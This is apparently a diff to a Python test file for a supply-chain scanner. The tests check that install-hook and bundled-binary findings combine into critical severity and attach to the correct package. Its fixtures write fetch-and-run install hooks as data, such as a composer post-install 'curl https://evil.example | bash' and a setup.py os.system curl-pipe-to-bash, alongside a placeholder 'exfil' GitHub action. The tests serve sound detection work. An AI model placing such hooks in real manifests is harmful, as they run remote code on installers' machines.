@@ -12,9 +12,14 @@ classification as the original npm install_hooks detector.
 Each test asserts that:
 
   1. The new-adapter finding lands under the right family
-  2. The conjunction with a same-dep BINARY-family finding
+  2. The conjunction with a same-package BINARY-family finding
      promotes the row(s) to ``critical`` via the HOOK+BINARY
      hard-pair rule
+
+The deps lists are produced by the REAL parsers (``parse_manifest``)
+— a package is never a dep of its own manifest in parser output, so
+a hand-crafted self-dep shape would green-light an anchor join that
+production can't reach.
 """
 
 from __future__ import annotations
@@ -23,32 +28,22 @@ import json
 import struct
 from pathlib import Path
 
-from packages.sca.models import (
-    Confidence,
-    Dependency,
-    Manifest,
-    PinStyle,
-)
+from packages.sca.models import Manifest
+from packages.sca.parsers import parse_manifest
 from packages.sca.supply_chain import evaluate
-
-
-def _dep(name: str, ecosystem: str, *, declared_in: Path) -> Dependency:
-    return Dependency(
-        ecosystem=ecosystem,
-        name=name,
-        version="1.0.0",
-        declared_in=declared_in,
-        scope="main",
-        is_lockfile=False,
-        pin_style=PinStyle.EXACT,
-        direct=True,
-        purl=f"pkg:{ecosystem.lower()}/{name}@1.0.0",
-        parser_confidence=Confidence("high", reason="t"),
-    )
 
 
 def _manifest(p: Path, ecosystem: str) -> Manifest:
     return Manifest(path=p, ecosystem=ecosystem, is_lockfile=False)
+
+
+def _parsed_deps(*manifests: Manifest) -> list:
+    """Dependency rows exactly as the production pipeline would
+    parse them from the fixture manifests."""
+    out = []
+    for m in manifests:
+        out.extend(parse_manifest(m))
+    return out
 
 
 def _write_elf(p: Path) -> None:
@@ -67,7 +62,11 @@ def test_python_setup_py_with_curl_pipe_plus_binary_promotes_critical(
     AND an ELF binary ships in the same source tree must promote
     to critical via the HOOK+BINARY hard-pair rule."""
     py = tmp_path / "pyproject.toml"
-    py.write_text("[project]\nname='victim'\n", encoding="utf-8")
+    py.write_text(
+        "[project]\nname = 'victim'\n"
+        "dependencies = ['requests>=2.31.0']\n",
+        encoding="utf-8",
+    )
     setup_py = tmp_path / "setup.py"
     setup_py.write_text(
         "import os\n"
@@ -77,10 +76,12 @@ def test_python_setup_py_with_curl_pipe_plus_binary_promotes_critical(
     )
     _write_elf(tmp_path / "tools" / "payload")
     manifests = [_manifest(py, "PyPI")]
-    deps = [_dep("victim", "PyPI", declared_in=py)]
+    deps = _parsed_deps(*manifests)
+    assert any(d.name == "requests" for d in deps)
     findings = evaluate(tmp_path, manifests, deps)
     # Both HOOK (setup.py dangerous pattern) and BINARY (ELF in
-    # tree) families fire on the SAME dep.  Composite must promote.
+    # tree) families fire on the SAME package.  Composite must
+    # promote.
     hook_findings = [
         f for f in findings if f.kind == "install_hook_suspicious"
     ]
@@ -89,6 +90,10 @@ def test_python_setup_py_with_curl_pipe_plus_binary_promotes_critical(
     ]
     assert hook_findings, "expected hook finding from setup.py"
     assert binary_findings, "expected binary finding from tools/payload"
+    # Both anchor to the package's OWN name — never to the innocent
+    # first-declared dep.
+    for f in hook_findings + binary_findings:
+        assert f.dependency.name == "victim"
     # At least one must be promoted to critical via the hard-pair rule.
     critical = [
         f for f in findings
@@ -98,6 +103,11 @@ def test_python_setup_py_with_curl_pipe_plus_binary_promotes_critical(
     assert critical, (
         f"HOOK+BINARY conjunction must promote to critical; got "
         f"severities {[(f.kind, f.severity) for f in findings]}"
+    )
+    # The innocent declared dep must NOT ride the promotion.
+    assert not any(
+        f.dependency.name == "requests" and f.severity == "critical"
+        for f in findings
     )
 
 
@@ -113,13 +123,15 @@ def test_composer_dangerous_script_plus_binary_promotes_critical(
     cj = tmp_path / "composer.json"
     cj.write_text(json.dumps({
         "name": "vendor/x",
+        "require": {"monolog/monolog": "^3.0"},
         "scripts": {
             "post-install-cmd": "curl https://evil.example | bash",
         },
     }), encoding="utf-8")
     _write_elf(tmp_path / "tools" / "payload")
-    manifests = [_manifest(cj, "Composer")]
-    deps = [_dep("vendor/x", "Composer", declared_in=cj)]
+    manifests = [_manifest(cj, "Packagist")]
+    deps = _parsed_deps(*manifests)
+    assert any(d.name == "monolog/monolog" for d in deps)
     findings = evaluate(tmp_path, manifests, deps)
     critical = [
         f for f in findings
@@ -130,6 +142,7 @@ def test_composer_dangerous_script_plus_binary_promotes_critical(
         f"composer HOOK+BINARY conjunction must promote; got "
         f"{[(f.kind, f.severity) for f in findings]}"
     )
+    assert all(f.dependency.name == "vendor/x" for f in critical)
 
 
 # ---------------------------------------------------------------------------
@@ -158,7 +171,8 @@ def test_rubygems_extconf_dangerous_plus_binary_promotes_critical(
     )
     _write_elf(tmp_path / "tools" / "payload")
     manifests = [_manifest(gemfile, "RubyGems")]
-    deps = [_dep("victim", "RubyGems", declared_in=gemfile)]
+    deps = _parsed_deps(*manifests)
+    assert any(d.name == "victim" for d in deps)
     findings = evaluate(tmp_path, manifests, deps)
     critical = [
         f for f in findings
@@ -166,6 +180,10 @@ def test_rubygems_extconf_dangerous_plus_binary_promotes_critical(
         and f.kind in ("install_hook_suspicious", "binary_in_package")
     ]
     assert critical
+    # ``victim`` here is a DECLARED DEP of the Gemfile (the gem this
+    # project installs) — the hook/binary findings describe the
+    # project's own tree and must not be attributed to it.
+    assert not any(f.dependency.name == "victim" for f in critical)
 
 
 # ---------------------------------------------------------------------------
@@ -236,6 +254,7 @@ def test_runtime_privilege_binary_plus_hook_promotes_critical(
     pkg.write_text(json.dumps({
         "name": "rootkit-pkg",
         "version": "1.0.0",
+        "dependencies": {"lodash": "^4.17.21"},
         "scripts": {"postinstall": "./tools/payload"},
     }), encoding="utf-8")
     _write_elf_with_imports(
@@ -243,7 +262,8 @@ def test_runtime_privilege_binary_plus_hook_promotes_critical(
         ["ptrace", "setuid", "fork"],
     )
     manifests = [_manifest(pkg, "npm")]
-    deps = [_dep("rootkit-pkg", "npm", declared_in=pkg)]
+    deps = _parsed_deps(*manifests)
+    assert any(d.name == "lodash" for d in deps)
     findings = evaluate(tmp_path, manifests, deps)
     # Hook should fire (mediium via intree_has_binary), binary
     # fires high (Phase 8 forensic promotion).  Composite must
@@ -256,6 +276,13 @@ def test_runtime_privilege_binary_plus_hook_promotes_critical(
     assert critical, (
         f"runtime_privilege binary + hook on same dep must promote "
         f"to critical; got {[(f.kind, f.severity) for f in findings]}"
+    )
+    # Anchored to the package itself, not its first declared dep —
+    # and lodash must not spuriously compose with the hook.
+    assert all(f.dependency.name == "rootkit-pkg" for f in critical)
+    assert not any(
+        f.dependency.name == "lodash" and f.severity == "critical"
+        for f in findings
     )
 
 
@@ -278,7 +305,7 @@ def test_setup_py_only_no_composite_promotion(tmp_path: Path) -> None:
     """A Python dep where ONLY the HOOK family fires (no binary, no
     other family) must NOT be composite-promoted."""
     py = tmp_path / "pyproject.toml"
-    py.write_text("[project]\nname='only-hook'\n", encoding="utf-8")
+    py.write_text("[project]\nname = 'only-hook'\n", encoding="utf-8")
     setup_py = tmp_path / "setup.py"
     setup_py.write_text(
         "import os\nos.system('curl https://x | bash')\n"
@@ -286,10 +313,69 @@ def test_setup_py_only_no_composite_promotion(tmp_path: Path) -> None:
         encoding="utf-8",
     )
     manifests = [_manifest(py, "PyPI")]
-    deps = [_dep("only-hook", "PyPI", declared_in=py)]
+    deps = _parsed_deps(*manifests)
     findings = evaluate(tmp_path, manifests, deps)
     hooks = [f for f in findings if f.kind == "install_hook_suspicious"]
     assert hooks
     # Original severity should be ``high`` (pattern match), NOT
     # promoted to critical (no second family co-fires).
     assert all(f.severity == "high" for f in hooks)
+
+
+# ---------------------------------------------------------------------------
+# GHA + SENTINEL conjunction
+# ---------------------------------------------------------------------------
+
+def test_gha_drift_plus_sentinel_promotes_critical_on_real_parser_output(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """A sentinel-listed action pinned by a mutable tag is the
+    canonical compromised-action shape: the sentinel hit anchors at
+    the parser's action dep row, the drift finding must anchor at
+    the SAME key or the GHA+SENTINEL hard pair can never co-fire."""
+    from packages.sca.supply_chain import sentinel as _sentinel
+
+    wf = tmp_path / ".github" / "workflows" / "ci.yml"
+    wf.parent.mkdir(parents=True)
+    wf.write_text(
+        "name: ci\n"
+        "on: [push]\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: evil/exfil-action@v1\n",
+        encoding="utf-8",
+    )
+    monkeypatch.setattr(_sentinel, "_CACHE", {
+        ("GitHub Actions", "evil/exfil-action"): [{
+            "incident": "test incident",
+            "ref": "https://example.invalid/advisory",
+            "versions": ["*"],
+        }],
+    })
+
+    manifests = [_manifest(wf, "Inline")]
+    deps = _parsed_deps(*manifests)
+    action_rows = [d for d in deps if d.ecosystem == "GitHub Actions"]
+    assert action_rows and action_rows[0].name == "evil/exfil-action"
+
+    findings = evaluate(tmp_path, manifests, deps)
+    by_kind = {f.kind: f for f in findings}
+    assert "sentinel_match" in by_kind
+    assert "gha_action_ref_drift" in by_kind
+
+    sent = by_kind["sentinel_match"]
+    drift = by_kind["gha_action_ref_drift"]
+    # Same composite key: (ecosystem, name, version).
+    assert (
+        (sent.dependency.ecosystem, sent.dependency.name,
+         sent.dependency.version)
+        == (drift.dependency.ecosystem, drift.dependency.name,
+            drift.dependency.version)
+    )
+    # Hard pair fired: both rows promoted to critical.
+    assert sent.severity == "critical"
+    assert drift.severity == "critical"
+    assert "composite_score" in drift.evidence
+    assert "composite_score" in sent.evidence
